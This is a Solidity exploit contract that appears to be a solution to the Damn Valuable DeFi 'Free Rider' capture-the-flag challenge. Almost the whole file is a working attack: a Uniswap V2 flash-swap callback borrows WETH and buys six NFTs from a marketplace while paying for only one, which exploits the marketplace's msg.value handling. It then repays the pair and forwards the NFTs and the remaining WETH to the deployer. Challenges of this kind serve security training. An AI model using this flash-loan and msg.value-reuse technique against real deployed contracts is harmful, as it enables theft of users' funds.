// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attacker {
    
    FreeRiderNFTMarketplace marketplace;
    address deployer;
    uint256 constant NFT_PRICE = 15 ether;
    WETH weth;
    uint256 constant AMOUNT_OF_NFTS = 6;
    DamnValuableNFT nft;
    IUniswapV2Pair uniswapPair;

    constructor(FreeRiderNFTMarketplace _marketplace, WETH _weth, IUniswapV2Pair _uniswapPair, DamnValuableNFT _nft) payable {
        deployer = msg.sender;
        marketplace = _marketplace;
        weth = _weth;
        uniswapPair = _uniswapPair;
        nft = _nft;
    }

     function uniswapV2Call(address, uint, uint, bytes calldata) external {
        weth.withdraw(NFT_PRICE);
        // weth.transferFrom(deployer, address(this), NFT_PRICE);
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value:NFT_PRICE}(ids); // use call with data instead
        
        weth.deposit{value:address(this).balance}();
        weth.transfer(address(uniswapPair), 151e17);

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), deployer, i);
        }
        weth.transfer(deployer, weth.balanceOf(address(this)));
     }

     function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}